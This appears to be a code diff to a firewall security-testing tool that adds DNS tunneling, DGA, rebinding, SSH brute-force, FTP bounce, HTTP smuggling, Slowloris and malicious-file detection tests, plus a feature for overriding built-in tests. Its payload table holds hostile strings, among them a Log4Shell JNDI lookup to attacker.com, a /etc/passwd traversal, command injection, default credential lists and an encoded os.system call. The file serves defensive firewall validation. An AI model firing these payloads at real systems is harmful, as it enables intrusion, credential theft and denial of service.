@@ -87,6 +87,19 @@ EXPECTED_BEHAVIOR = {
     'url_phishing': 'Firewall URL Filtering should block URLs categorized as phishing in PAN-DB',
     'url_hacking': 'Firewall URL Filtering should block URLs categorized as hacking in PAN-DB',
     'url_proxy': 'Firewall URL Filtering should block URLs categorized as proxy-avoidance/anonymizers in PAN-DB',
+    # DNS Attacks
+    'dns_tunnel': 'Firewall Anti-Spyware profile should detect anomalous DNS queries with long, encoded subdomain labels indicative of DNS tunneling (iodine, dnscat2)',
+    'dns_dga': 'Firewall Anti-Spyware should detect high-entropy, algorithmically-generated domain names characteristic of DGA-based botnet C2 communication',
+    'dns_rebind': 'Firewall should detect DNS rebinding patterns where domains resolve to private IP ranges, potentially bypassing same-origin policy',
+    # Protocol Abuse
+    'ssh_bruteforce': 'Firewall Vulnerability Protection / Zone Protection should detect rapid SSH login failures and trigger brute-force protection signatures',
+    'ftp_bounce': 'Firewall should detect FTP PORT commands targeting internal IP addresses, a technique used for network reconnaissance (FTP bounce scan)',
+    'http_smuggle': 'Firewall should detect ambiguous Content-Length / Transfer-Encoding headers used in HTTP request smuggling attacks',
+    'slowloris': 'Firewall or Zone Protection profile should detect slow-rate DoS patterns (Slowloris) where connections send partial headers to exhaust server resources',
+    # File-Based Threats
+    'pdf_js': 'Firewall Anti-Virus or File Blocking profile should detect and block PDF files containing embedded JavaScript, commonly used for exploitation',
+    'office_macro': 'Firewall Anti-Virus or File Blocking should detect OLE2 documents with VBA macros (AutoOpen), a primary malware delivery vector',
+    'pe_download': 'Firewall File Blocking or Anti-Virus profile should detect PE executable (MZ/PE header) downloads over HTTP and block based on file type policy',
 }
 
 # ─── Test Catalog ───────────────────────────────────────────
@@ -160,7 +173,47 @@ URL_FILTERING_TESTS = [
         'block', 'URL Filtering'),
 ]
 
-ALL_TESTS = WEB_ATTACK_TESTS + MALWARE_TESTS + URL_FILTERING_TESTS
+DNS_ATTACK_TESTS = [
+    SecurityTestCase('dns_tunnel', 'DNS Tunneling Detection',
+        'dns_attacks', 'Sends DNS queries with suspiciously long subdomain labels containing base64-encoded data, mimicking DNS tunneling tools like iodine or dnscat2. The firewall Anti-Spyware profile should detect anomalous DNS query patterns.',
+        'block', 'Anti-Spyware'),
+    SecurityTestCase('dns_dga', 'DGA Domain Detection',
+        'dns_attacks', 'Queries multiple algorithmically-generated domain names that mimic Domain Generation Algorithm (DGA) patterns used by malware botnets. The firewall should detect the entropy and pattern of DGA domains.',
+        'block', 'Anti-Spyware'),
+    SecurityTestCase('dns_rebind', 'DNS Rebinding Attempt',
+        'dns_attacks', 'Queries domains that could be used in DNS rebinding attacks, where a domain alternates between external and private IP addresses to bypass same-origin policy and access internal resources.',
+        'block', 'Anti-Spyware'),
+]
+
+PROTOCOL_ABUSE_TESTS = [
+    SecurityTestCase('ssh_bruteforce', 'SSH Brute Force Pattern',
+        'protocol_abuse', 'Performs rapid successive SSH login attempts with different credentials, simulating a brute-force attack. The firewall should detect the high rate of failed authentication attempts and trigger a brute-force protection signature.',
+        'block', 'Vulnerability Protection'),
+    SecurityTestCase('ftp_bounce', 'FTP Bounce Scan',
+        'protocol_abuse', 'Attempts to use FTP PORT command to redirect data connections to internal IP addresses, simulating an FTP bounce scan used for internal network reconnaissance.',
+        'block', 'Vulnerability Protection'),
+    SecurityTestCase('http_smuggle', 'HTTP Request Smuggling',
+        'protocol_abuse', 'Sends an HTTP request with ambiguous Content-Length and Transfer-Encoding headers to exploit parsing differences between firewall and server, potentially smuggling malicious requests.',
+        'block', 'Vulnerability Protection'),
+    SecurityTestCase('slowloris', 'Slowloris DoS Pattern',
+        'protocol_abuse', 'Opens an HTTP connection and sends partial headers very slowly, keeping the connection alive without completing the request. This Slowloris-style pattern should be detected by the firewall as a denial-of-service attempt.',
+        'block', 'Vulnerability Protection'),
+]
+
+FILE_THREAT_TESTS = [
+    SecurityTestCase('pdf_js', 'PDF with Embedded JavaScript',
+        'file_threats', 'Downloads a PDF file containing embedded JavaScript (app.alert action). The firewall Anti-Virus or file blocking profile should detect and block PDFs with active content as they are commonly used for exploitation.',
+        'block', 'Anti-Virus'),
+    SecurityTestCase('office_macro', 'Office Document with VBA Macro',
+        'file_threats', 'Downloads a file with OLE2 compound document header and VBA macro signatures (AutoOpen). The firewall should detect and block files containing macro code, as they are a primary vector for malware delivery.',
+        'block', 'Anti-Virus'),
+    SecurityTestCase('pe_download', 'PE Executable Download — HTTP',
+        'file_threats', 'Downloads a Windows PE executable file (MZ/PE header) over HTTP. The firewall file blocking or Anti-Virus profile should detect the executable file type and block the download based on policy.',
+        'block', 'Anti-Virus'),
+]
+
+ALL_TESTS = (WEB_ATTACK_TESTS + MALWARE_TESTS + URL_FILTERING_TESTS +
+             DNS_ATTACK_TESTS + PROTOCOL_ABUSE_TESTS + FILE_THREAT_TESTS)
 TEST_MAP = {t.id: t for t in ALL_TESTS}
 
 # Default URL Filtering test URLs (configurable at runtime)
@@ -197,6 +250,19 @@ ATTACK_PAYLOADS = {
     'cmdi_backtick': '`id`',
     'path_traversal': '../../../../etc/passwd',
     'log4shell': '${jndi:ldap://attacker.com/exploit}',
+    # DNS Attacks
+    'dns_tunnel': 'dnscat.aW1wb3J0IG9zO29zLnN5c3RlbSgiY2F0IC9ldGMvcGFzc3dkIik.tunnel.example.com',
+    'dns_dga': 'xkqrtvwzmjfhglpnds.com|bvycxqwrtmjnhkgfdp.net|zlkxjwrmqnvghftdps.org',
+    'dns_rebind': 'rebind-127.0.0.1-169.254.169.254.example.com',
+    # Protocol Abuse
+    'ssh_bruteforce': 'admin:password|root:toor|admin:admin123|root:root|test:test123',
+    'ftp_bounce': 'PORT 192,168,1,1,0,80',
+    'http_smuggle': 'Transfer-Encoding: chunked\r\nContent-Length: 42\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal',
+    'slowloris': 'X-Slowloris-Header-{n}: keep-alive-{n}',
+    # File-Based Threats
+    'pdf_js': '/test-file/pdf-js',
+    'office_macro': '/test-file/office-macro',
+    'pe_download': '/test-file/pe',
 }
 
 # ─── Custom Pattern Store ──────────────────────────────────
@@ -316,11 +382,52 @@ class SecurityTestEngine:
             self._reload_custom()
 
     def _reload_custom(self):
-        """Refresh test catalog with custom patterns."""
+        """Refresh test catalog with custom patterns and overrides."""
         self._all_tests = list(ALL_TESTS)
         self._test_map = dict(TEST_MAP)
         if self._custom_store:
-            for tc in self._custom_store.to_test_cases():
+            overrides = {}  # override_of test_id → custom pattern
+            customs = []
+            for p in self._custom_store.list():
+                if p.get('override_of'):
+                    overrides[p['override_of']] = p
+                else:
+                    customs.append(p)
+            # Apply overrides — replace built-in tests in-place
+            if overrides:
+                new_all = []
+                for t in self._all_tests:
+                    if t.id in overrides:
+                        p = overrides[t.id]
+                        ot = SecurityTestCase(
+                            id=t.id, name=p.get('name', t.name),
+                            category=p.get('category', t.category),
+                            description=p.get('description', t.description),
+                            expected_action=p.get('expected_action', t.expected_action),
+                            panos_feature=p.get('panos_feature', t.panos_feature),
+                            custom=True, payload=p.get('payload', ''),
+                            method=p.get('method', t.method),
+                            headers=p.get('headers', {}),
+                            target_path=p.get('target_path', t.target_path),
+                        )
+                        new_all.append(ot)
+                        self._test_map[t.id] = ot
+                    else:
+                        new_all.append(t)
+                self._all_tests = new_all
+            # Add pure custom patterns
+            for p in customs:
+                tc = SecurityTestCase(
+                    id=p['id'], name=p.get('name', 'Custom Test'),
+                    category=p.get('category', 'web_attacks'),
+                    description=p.get('description', ''),
+                    expected_action=p.get('expected_action', 'block'),
+                    panos_feature=p.get('panos_feature', 'Vulnerability Protection'),
+                    custom=True, payload=p.get('payload', ''),
+                    method=p.get('method', 'GET'),
+                    headers=p.get('headers', {}),
+                    target_path=p.get('target_path', '/echo'),
+                )
                 self._all_tests.append(tc)
                 self._test_map[tc.id] = tc
 
@@ -331,14 +438,28 @@ class SecurityTestEngine:
     def get_catalog(self) -> dict:
         """Return test catalog grouped by category."""
         self._reload_custom()
+        # Build set of overridden test IDs
+        overridden_ids = set()
+        if self._custom_store:
+            for p in self._custom_store.list():
+                oid = p.get('override_of')
+                if oid:
+                    overridden_ids.add(oid)
         groups = {}
         for t in self._all_tests:
             if t.category not in groups:
                 groups[t.category] = []
+            is_builtin = t.id in TEST_MAP
             groups[t.category].append({
                 'id': t.id, 'name': t.name, 'category': t.category,
                 'description': t.description, 'expected_action': t.expected_action,
                 'panos_feature': t.panos_feature, 'custom': t.custom,
+                'editable': True,
+                'overridden': t.id in overridden_ids,
+                'builtin': is_builtin and not t.custom,
+                'payload': ATTACK_PAYLOADS.get(t.id, t.payload if t.custom else ''),
+                'method': t.method, 'headers': t.headers,
+                'target_path': t.target_path,
             })
         return groups
 
@@ -462,6 +583,8 @@ class SecurityTestEngine:
                       http_port: int, https_port: int) -> SecurityTestResult:
         """Run a single test and determine verdict."""
         if test.custom:
+            # Overridden built-in tests: check if the original ID maps to a built-in
+            # If so, still use custom handler (user edited payload/method)
             return self._test_custom(test, host, http_port)
         if test.category == 'web_attacks':
             return self._test_web_attack(test, host, http_port)
@@ -469,6 +592,12 @@ class SecurityTestEngine:
             return self._test_malware(test, host, http_port, https_port)
         elif test.category == 'url_filtering':
             return self._test_url_filtering(test)
+        elif test.category == 'dns_attacks':
+            return self._test_dns_attack(test, host)
+        elif test.category == 'protocol_abuse':
+            return self._test_protocol_abuse(test, host, http_port)
+        elif test.category == 'file_threats':
+            return self._test_file_threat(test, host, http_port)
         else:
             return self._error_result(test, f'Unknown category: {test.category}')
 
@@ -641,6 +770,322 @@ class SecurityTestEngine:
         except (requests.ConnectionError, requests.Timeout) as e:
             return self._blocked_result(test, f'Connection blocked: {e}',
                 url=url, method='GET', sent_payload=payload)
+
+    def _test_dns_attack(self, test: SecurityTestCase, host: str) -> SecurityTestResult:
+        """Test DNS-based attacks using dig."""
+        payload = ATTACK_PAYLOADS.get(test.id, '')
+
+        if test.id == 'dns_tunnel':
+            # Send DNS query with suspiciously long encoded subdomain
+            domain = payload
+            try:
+                result = subprocess.run(
+                    ['dig', f'@{host}', domain, 'A', '+time=5', '+tries=1'],
+                    capture_output=True, text=True, timeout=10)
+                output = result.stdout + result.stderr
+                if result.returncode != 0 or 'connection timed out' in output.lower() or 'no servers could be reached' in output.lower():
+                    return self._blocked_result(test,
+                        'DNS query timed out or refused — likely blocked by firewall',
+                        url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
+                if 'ANSWER SECTION' in output:
+                    return self._passthrough_result(test, 0,
+                        'DNS tunnel query resolved — not blocked',
+                        url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
+                return self._blocked_result(test,
+                    'DNS query returned no answer — likely blocked',
+                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
+            except subprocess.TimeoutExpired:
+                return self._blocked_result(test, 'DNS query timed out — blocked by firewall',
+                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
+            except Exception as e:
+                return self._error_result(test, str(e),
+                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
+
+        elif test.id == 'dns_dga':
+            # Query multiple DGA-like domains
+            domains = payload.split('|')
+            blocked_count = 0
+            resolved_count = 0
+            for domain in domains:
+                try:
+                    result = subprocess.run(
+                        ['dig', f'@{host}', domain.strip(), 'A', '+time=3', '+tries=1'],
+                        capture_output=True, text=True, timeout=8)
+                    output = result.stdout + result.stderr
+                    if result.returncode != 0 or 'connection timed out' in output.lower() or 'SERVFAIL' in output:
+                        blocked_count += 1
+                    elif 'ANSWER SECTION' in output:
+                        resolved_count += 1
+                    else:
+                        blocked_count += 1
+                except (subprocess.TimeoutExpired, Exception):
+                    blocked_count += 1
+            if blocked_count >= len(domains):
+                return self._blocked_result(test,
+                    f'All {len(domains)} DGA domains blocked/refused',
+                    url=f'dig @{host} [DGA domains]', method='DNS', sent_payload=payload)
+            elif blocked_count > 0:
+                return self._blocked_result(test,
+                    f'{blocked_count}/{len(domains)} DGA domains blocked',
+                    url=f'dig @{host} [DGA domains]', method='DNS', sent_payload=payload)
+            return self._passthrough_result(test, 0,
+                f'All {resolved_count} DGA domains resolved — not blocked',
+                url=f'dig @{host} [DGA domains]', method='DNS', sent_payload=payload)
+
+        elif test.id == 'dns_rebind':
+            # Query domain that could resolve to private IPs
+            domain = payload
+            try:
+                result = subprocess.run(
+                    ['dig', f'@{host}', domain, 'A', '+time=5', '+tries=1'],
+                    capture_output=True, text=True, timeout=10)
+                output = result.stdout + result.stderr
+                if result.returncode != 0 or 'connection timed out' in output.lower():
+                    return self._blocked_result(test,
+                        'DNS rebinding query blocked/refused',
+                        url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
+                if 'ANSWER SECTION' in output:
+                    return self._passthrough_result(test, 0,
+                        'DNS rebinding domain resolved — not blocked',
+                        url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
+                return self._blocked_result(test,
+                    'No answer for rebinding domain — blocked',
+                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
+            except subprocess.TimeoutExpired:
+                return self._blocked_result(test, 'DNS query timed out — blocked',
+                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
+            except Exception as e:
+                return self._error_result(test, str(e),
+                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
+
+        return self._error_result(test, f'Unknown DNS test: {test.id}')
+
+    def _test_protocol_abuse(self, test: SecurityTestCase, host: str,
+                              http_port: int) -> SecurityTestResult:
+        """Test protocol abuse patterns."""
+        payload = ATTACK_PAYLOADS.get(test.id, '')
+
+        if test.id == 'ssh_bruteforce':
+            # Rapid SSH login attempts with different credentials
+            creds = [c.split(':') for c in payload.split('|') if ':' in c]
+            blocked = False
+            attempts = 0
+            for user, passwd in creds[:5]:
+                attempts += 1
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(5)
+                    s.connect((host, 2222))
+                    banner = s.recv(1024)
+                    s.close()
+                except (socket.timeout, ConnectionRefusedError, OSError):
+                    blocked = True
+                    break
+                time.sleep(0.2)
+            if blocked:
+                return self._blocked_result(test,
+                    f'SSH connection refused after {attempts} attempts — brute-force detected',
+                    url=f'ssh://{host}:2222', method='SSH', sent_payload=payload)
+            return self._passthrough_result(test, 0,
+                f'All {attempts} SSH connection attempts succeeded — brute-force not detected',
+                url=f'ssh://{host}:2222', method='SSH', sent_payload=payload)
+
+        elif test.id == 'ftp_bounce':
+            # Attempt FTP PORT command to internal IP
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(10)
+                s.connect((host, 21))
+                banner = s.recv(1024).decode('utf-8', errors='replace')
+                s.sendall(b'USER anonymous\r\n')
+                s.recv(1024)
+                s.sendall(b'PASS test@test.com\r\n')
+                s.recv(1024)
+                # Send PORT command targeting internal IP
+                port_cmd = f'PORT {payload}\r\n'.encode()
+                s.sendall(port_cmd)
+                resp = s.recv(1024).decode('utf-8', errors='replace')
+                s.sendall(b'QUIT\r\n')
+                s.close()
+                if '200' in resp or '150' in resp:
+                    return self._passthrough_result(test, 0,
+                        f'FTP PORT to internal IP accepted — bounce scan possible',
+                        url=f'ftp://{host}:21', method='FTP', sent_payload=payload)
+                return self._blocked_result(test,
+                    f'FTP PORT rejected: {resp.strip()} — bounce scan blocked',
+                    url=f'ftp://{host}:21', method='FTP', sent_payload=payload)
+            except (socket.timeout, ConnectionRefusedError, OSError) as e:
+                return self._blocked_result(test, f'FTP connection failed: {e}',
+                    url=f'ftp://{host}:21', method='FTP', sent_payload=payload)
+
+        elif test.id == 'http_smuggle':
+            # Send request with conflicting Content-Length and Transfer-Encoding
+            url = f'http://{host}:{http_port}/echo'
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(10)
+                s.connect((host, http_port))
+                smuggle_req = (
+                    f'POST /echo HTTP/1.1\r\n'
+                    f'Host: {host}:{http_port}\r\n'
+                    f'Content-Length: 6\r\n'
+                    f'Transfer-Encoding: chunked\r\n'
+                    f'\r\n'
+                    f'0\r\n'
+                    f'\r\n'
+                    f'G'
+                ).encode()
+                s.sendall(smuggle_req)
+                resp = s.recv(4096).decode('utf-8', errors='replace')
+                s.close()
+                if not resp or 'reset' in resp.lower():
+                    return self._blocked_result(test,
+                        'Connection reset — HTTP smuggling detected and blocked',
+                        url=url, method='POST', sent_payload=payload)
+                if 'HTTP/1.1 200' in resp or 'HTTP/1.0 200' in resp:
+                    return self._passthrough_result(test, 200,
+                        'Server accepted smuggled request — not blocked',
+                        url=url, method='POST', sent_payload=payload)
+                if '400' in resp or '403' in resp:
+                    return self._blocked_result(test,
+                        f'Server rejected: {resp[:100]} — smuggling blocked',
+                        url=url, method='POST', sent_payload=payload)
+                return self._passthrough_result(test, 0,
+                    f'Response: {resp[:100]}',
+                    url=url, method='POST', sent_payload=payload)
+            except (socket.timeout, ConnectionRefusedError, OSError) as e:
+                return self._blocked_result(test, f'Connection blocked: {e}',
+                    url=url, method='POST', sent_payload=payload)
+
+        elif test.id == 'slowloris':
+            # Open connection and send partial headers slowly
+            url = f'http://{host}:{http_port}/'
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(15)
+                s.connect((host, http_port))
+                # Send partial HTTP request header
+                s.sendall(f'GET / HTTP/1.1\r\nHost: {host}\r\n'.encode())
+                # Send additional headers slowly
+                blocked = False
+                for i in range(5):
+                    try:
+                        header = f'X-Slowloris-{i}: keep-alive-{i}\r\n'.encode()
+                        s.sendall(header)
+                        time.sleep(1)
+                    except (BrokenPipeError, ConnectionResetError, OSError):
+                        blocked = True
+                        break
+                s.close()
+                if blocked:
+                    return self._blocked_result(test,
+                        'Connection reset during slow headers — Slowloris pattern detected',
+                        url=url, method='GET', sent_payload=payload)
+                return self._passthrough_result(test, 0,
+                    'Slow header sending completed — Slowloris pattern not detected',
+                    url=url, method='GET', sent_payload=payload)
+            except (socket.timeout, ConnectionRefusedError, OSError) as e:
+                return self._blocked_result(test, f'Connection blocked: {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        return self._error_result(test, f'Unknown protocol abuse test: {test.id}')
+
+    def _test_file_threat(self, test: SecurityTestCase, host: str,
+                           http_port: int) -> SecurityTestResult:
+        """Test file-based threat detection by downloading test files."""
+        endpoint = ATTACK_PAYLOADS.get(test.id, '')
+        url = f'http://{host}:{http_port}{endpoint}'
+        payload = f'Download test file from {endpoint}'
+
+        # Map test IDs to expected file signatures
+        file_checks = {
+            'pdf_js': (b'%PDF', 'PDF with JavaScript'),
+            'office_macro': (b'\xd0\xcf\x11\xe0', 'OLE2 document with VBA macro'),
+            'pe_download': (b'MZ', 'PE executable'),
+        }
+
+        check = file_checks.get(test.id)
+        if not check:
+            return self._error_result(test, f'Unknown file threat test: {test.id}')
+
+        magic, desc = check
+        try:
+            resp = requests.get(url, timeout=10)
+            if resp.status_code == 200 and resp.content[:len(magic)] == magic:
+                return self._passthrough_result(test, resp.status_code,
+                    f'{desc} downloaded successfully — not blocked by firewall',
+                    resp=resp, url=url, method='GET', sent_payload=payload)
+            if self._is_block_page(resp):
+                return self._blocked_result(test,
+                    f'HTTP {resp.status_code} — Block page detected for {desc}',
+                    resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
+            if resp.status_code in (403, 406, 503):
+                return self._blocked_result(test,
+                    f'HTTP {resp.status_code} — {desc} blocked', resp.status_code,
+                    resp=resp, url=url, method='GET', sent_payload=payload)
+            return self._analyze_response(test, resp, '',
+                url=url, method='GET', sent_payload=payload)
+        except (requests.ConnectionError, requests.Timeout) as e:
+            return self._blocked_result(test, f'Connection blocked: {e}',
+                url=url, method='GET', sent_payload=payload)
+
+    # ─── Built-in Test Overrides ─────────────────────────────
+
+    def get_builtin_test(self, test_id: str) -> Optional[dict]:
+        """Return the original unmodified built-in test for reset purposes."""
+        original = TEST_MAP.get(test_id)
+        if not original:
+            return None
+        return {
+            'id': original.id, 'name': original.name, 'category': original.category,
+            'description': original.description, 'expected_action': original.expected_action,
+            'panos_feature': original.panos_feature, 'payload': ATTACK_PAYLOADS.get(original.id, ''),
+            'method': original.method, 'headers': original.headers,
+            'target_path': original.target_path,
+        }
+
+    def save_override(self, test_id: str, updates: dict) -> Optional[dict]:
+        """Save an override for a built-in test. Uses custom store with override_of field."""
+        if test_id not in TEST_MAP:
+            return None
+        if not self._custom_store:
+            return None
+        original = TEST_MAP[test_id]
+        # Check if override already exists
+        existing = None
+        for p in self._custom_store.list():
+            if p.get('override_of') == test_id:
+                existing = p
+                break
+        override_data = {
+            'name': updates.get('name', original.name),
+            'category': updates.get('category', original.category),
+            'description': updates.get('description', original.description),
+            'payload': updates.get('payload', ATTACK_PAYLOADS.get(test_id, '')),
+            'method': updates.get('method', original.method),
+            'headers': updates.get('headers', original.headers),
+            'target_path': updates.get('target_path', original.target_path),
+            'expected_action': updates.get('expected_action', original.expected_action),
+            'panos_feature': updates.get('panos_feature', original.panos_feature),
+            'override_of': test_id,
+        }
+        if existing:
+            result = self._custom_store.update(existing['id'], override_data)
+        else:
+            result = self._custom_store.add(override_data)
+        self._reload_custom()
+        return result
+
+    def delete_override(self, test_id: str) -> bool:
+        """Remove override for a built-in test (reset to default)."""
+        if not self._custom_store:
+            return False
+        for p in self._custom_store.list():
+            if p.get('override_of') == test_id:
+                self._custom_store.delete(p['id'])
+                self._reload_custom()
+                return True
+        return False
 
     # ─── Response Analysis ──────────────────────────────────
 
